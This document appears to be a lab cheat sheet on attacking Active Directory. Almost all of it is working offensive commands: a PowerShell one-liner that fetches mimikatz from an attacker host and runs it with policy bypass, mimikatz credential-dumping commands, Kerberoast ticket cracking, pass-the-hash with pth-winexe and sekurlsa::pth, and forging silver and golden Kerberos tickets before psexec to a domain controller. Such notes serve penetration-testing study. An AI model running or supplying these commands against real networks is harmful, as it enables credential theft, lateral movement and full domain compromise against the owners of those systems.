# Attacking Active Directory
## Lab Environment
|Server|IP Address|OS|Function|
|---|---|---|---|
|dc.lab.vx|192.168.17.141|Windows Server 2016|Domain Controller|
|svr.lab.vx|192.168.17.151|Windows Server 2016|Domain Member Server, SQL Server|
|client.lab.vx|192.168.17.161|Windows 10 1607|Domain Member Workstation, SQL Server Management Studio|

# Cached Credential Storage and Retrieval
**On Kali**: Setup web server to host `mimikatz`
```console
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
sudo python3 -m http.server 80 &> /dev/null &
```
**On Target**: Download and run `mimikatz`
- Download: `(New-Object System.Net.WebClient).DownloadFile()`
- Run: `Start-Process`
```console
powershell.exe -nop -Exec Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/mimikatz.exe', $env:APPDATA + '\mimikatz.exe'); Start-Process $env:APPDATA\mimikatz.exe
```
**On Target**: mimikatz commands
- Ref: <https://tools.thehacker.recipes/mimikatz>

|Command|Function|
|---|---|
|`privilege::debug`|Requests the debug privilege `SeDebugPrivilege`; required to debug and adjust the memory of a process owned by another account|
|`token::elevate`|Impersonates a SYSTEM token (default) or domain admin token (using `/domainadmin`)|
|`lsadump::sam`|Dumps the local Security Account Manager (SAM) NT hashes; operate directly on the target system, or offline with registry hives backups (for SAM and SYSTEM)|
|`lsadump::lsa /patch`|Extracts hashes from memory by asking the LSA server; `/patch` or `/inject` takes place on the fly|
|`sekurlsa::logonpasswords`|Lists all available provider credentials; usually shows recently logged on user and computer credentials|

# Service Account Attack (Kerberoasting)
```console
kerberos::list /export
sudo apt update && sudo apt install kerberoast
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
```

# Pass the Hash

☝️ **Note**: LM hashes are not used from Windows 10 onwards, string of 32 zeros can used to fill the LM hash portion of the pth-winexe command

## pth-winexe
- Local account
```console
pth-winexe -U administrator%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.151 cmd
```
- Domain account
```console
pth-winexe -U LAB/domainadmin%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.151 cmd
```
## mimikatz - sekurlsa::pth
- Local account
```console
sekurlsa::pth /user:administrator /domain:* /ntlm:e19ccf75ee54e06b06a5907af13cef42 /run:powershell.exe
```
- Domain account
```console
sekurlsa::pth /user:domainadmin /domain:lab.vx /ntlm:e19ccf75ee54e06b06a5907af13cef42 /run:powershell.exe
```

# Silver Ticket
```console
kerberos::purge
kerberos::list
kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
kerberos::list
```

# Golden Ticket
```console
lsadump::lsa /patch
kerberos::purge
kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
misc::cmd
psexec.exe \\dc01 cmd.exe
```
